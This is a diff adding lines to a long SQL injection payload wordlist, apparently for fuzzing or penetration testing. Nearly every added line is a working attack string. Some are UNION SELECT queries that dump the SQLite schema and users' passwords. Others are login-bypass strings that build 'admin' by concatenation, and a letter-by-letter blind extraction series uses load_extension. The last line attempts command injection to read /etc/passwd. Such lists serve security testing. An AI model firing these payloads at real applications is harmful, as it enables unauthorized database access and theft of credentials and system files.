@@ -26531,3 +26531,84 @@ x'/**/or/**/full_name/**/like/**/'%bob%
 乗'/**/or/**/1=1/**/--/**/
 乗'/**/OR/**/1=1/**/--/**/乗'
 乗'/**/or/**/1=1/**/--/**/乗'
+' OR 1 UNION SELECT 1,(SELECT * FROM sqlite_master WHERE type='table'),3 -- -
+' OR 1 UNION SELECT 1,(SELECT GROUP_CONCAT(password) FROM users),3 -- -
+' OR 1 UNION SELECT 1,(SELECT GROUP_CONCAT(name," ") FROM PRAGMA table_info(users)),3 -- -
+' OR 1 UNION SELECT 1,(SELECT group_concat(sql," ") FROM sqlite_master WHERE tbl_name='users'),3 -- -
+a'||'d'||'m'||'i'||'n'IS 1/*
+a'||'d'||'m'||'i'||'n'IS 1 /*
+a'||'d'||'m'||'i'||'n'IS 1--
+a'||'d'||'m'||'i'||'n'IS 1-- -
+a'||'d'||'m'||'i'||'n'IS 1 --
+a'||'d'||'m'||'i'||'n'IS 1 -- -
+'+CONCAT('a','d','m','i','n') OR 1=1/*
+'+CONCAT('a','d','m','i','n') OR 1=1 /*
+'+CONCAT('a','d','m','i','n') OR 1=1--
+'+CONCAT('a','d','m','i','n') OR 1=1 --
+'+CONCAT('a','d','m','i','n') OR 1=1 -- -
+'+CONCAT('a','d','m','i','n') OR 1=1-- -
+'+CONCAT('a','d','m','i','n') AND 1=1/*
+'+CONCAT('a','d','m','i','n') AND 1=1 /*
+'+CONCAT('a','d','m','i','n') AND 1=1--
+'+CONCAT('a','d','m','i','n') AND 1=1 --
+'+CONCAT('a','d','m','i','n') AND 1=1 -- -
+'+CONCAT('a','d','m','i','n') AND 1=1-- -
+'+CONCAT('a','d','m','i','n')IS NOT NULL --
+'+CONCAT('a','d','m','i','n')IS NOT NULL -- -
+'+CONCAT('a','d','m','i','n')IS NOT NULL /*
+'+CONCAT('a','d','m','i','n')IS NOT NULL--
+'+CONCAT('a','d','m','i','n')IS NOT NULL-- -
+'+CONCAT('a','d','m','i','n')IS NOT NULL/*
+'IS NOT NULL/*
+'IS NOT NULL /*
+'IS NOT NULL--
+'IS NOT NULL-- -
+'IS NOT NULL --
+'IS NOT NULL -- -
+admi'+'n'IS NOT NULL/*
+admi'+'n'IS NOT NULL /*
+admi'+'n'IS NOT NULL--
+admi'+'n'IS NOT NULL-- -
+admi'+'n'IS NOT NULL --
+admi'+'n'IS NOT NULL -- -
+admi'||'n'IS NOT 0'
+admi'||'n'IS NOT 0/*
+admi'||'n'IS NOT 0 /*
+admi'||'n'IS NOT 0--
+admi'||'n'IS NOT 0 --
+admi'||'n'IS NOT 0-- -
+admi'||'n'IS NOT 0 -- -
+'IS NOT 1'
+'IS NOT 1/*
+'IS NOT 1--
+'IS NOT 1 --
+'IS NOT 1-- -
+'IS NOT 1 -- -
+'IS NOT 1 /*
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'a') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'b') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'c') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'd') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'e') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'f') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'g') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'h') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'i') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'j') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'k') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'l') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'm') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'n') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'o') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'p') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'q') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'r') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 's') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 't') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'u') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'v') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'w') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'x') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'y') THEN 1 ELSE load_extension(1) END -- -
+34242' OR CASE WHEN ((SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1) = 'z') THEN 1 ELSE load_extension(1) END -- -
+' OR system("cat /etc/passwd")
